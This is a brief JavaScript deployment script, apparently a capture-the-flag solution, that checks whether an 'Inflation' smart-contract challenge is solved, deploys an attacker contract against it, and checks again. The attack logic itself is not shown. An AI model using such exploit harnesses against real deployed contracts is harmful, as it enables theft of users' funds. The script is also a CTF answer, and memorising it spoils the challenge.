const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("bahurumAttacker");

  const setup = await ethers.getContractAt( "Setup", "0xABF1f66a9fb48F3f5b75C8A83FB5854A9d906343" );
  const ctf = await ethers.getContractAt( "Inflation", "0x68C3CA33c766cd60E4Af98D697EBd541B4DA7968" );

  console.log("solved:", await setup.isSolved());

  await EXPLOIT.deploy(ctf.address);

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
